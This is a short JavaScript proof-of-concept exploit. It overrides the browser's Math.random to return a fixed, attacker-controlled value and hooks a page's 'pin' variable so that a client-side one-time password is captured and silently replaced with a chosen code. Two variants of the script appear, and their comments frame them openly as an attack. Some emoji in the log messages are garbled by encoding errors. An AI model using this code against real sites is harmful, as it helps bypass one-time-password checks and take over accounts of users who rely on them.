// Step 3a: Hook Math.random to log predictable value
Math.random = function () {
    const fakeRandom = 0.12345678; // Fixed value, just for POC
    console.log("Math.random intercepted. Returning predictable value:", fakeRandom);
    return fakeRandom;
};

// Step 3b: Hijack the OTP value itself if available
Object.defineProperty(window, 'pin', {
    set(value) {
        console.log("OTP Intercepted before sending:", value);
        // Store to window so we can use it later
        window.interceptedOTP = value;
    },
    get() {
        return window.interceptedOTP;
    }
});




// Step 1: Store the original Math.random
const originalRandom = Math.random;

// Step 2: Override Math.random to log and store real value
let realRandomValue = null;
Math.random = function () {
    realRandomValue = originalRandom(); // Call real random
    console.log("‚úÖ Real Math.random value:", realRandomValue);
    return 0.12345678; // Return attacker-controlled fake value
};

// Step 3: Intercept and override the OTP
Object.defineProperty(window, 'pin', {
    set(value) {
        console.log("‚ö†Ô∏è Original OTP (from real Math.random):", value);
        const attackerOTP = 21111110; // Your fake predictable OTP
        console.log("üö® Replacing OTP with attacker-controlled value:", attackerOTP);
        window.interceptedOTP = attackerOTP; // Replace it silently
    },
    get() {
        return window.interceptedOTP;
    }
});
